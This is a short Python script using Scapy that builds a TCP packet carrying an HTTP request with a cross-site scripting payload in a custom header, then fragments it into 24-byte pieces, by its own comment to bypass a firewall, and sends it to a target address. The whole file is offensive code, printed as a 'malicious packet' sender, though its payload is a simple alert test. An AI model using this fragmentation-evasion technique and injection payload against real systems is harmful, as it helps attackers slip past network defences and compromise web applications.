from scapy.all import IP, TCP, send, fragment

ip_layer = IP(dst="203.0.113.10")
tcp_layer = TCP(dport=80, sport=12345, flags="S")

http_payload = (
    "GET /index.html HTTP/1.1\r\n"
    "Host: 203.0.113.10\r\n"
    "User-Agent: ScapyTest/1.0\r\n"
    "Accept: */*\r\n"
    "Custom-Payload: <script>alert('XSS');</script>\r\n" 
    "\r\n"
)

packet = ip_layer / tcp_layer / http_payload

#This fragments the packet to try to bypass the firewall.
frags = fragment(packet, fragsize=24)
send(frags)

print("Fragmented malicious packet sent to 203.0.113.10 target")
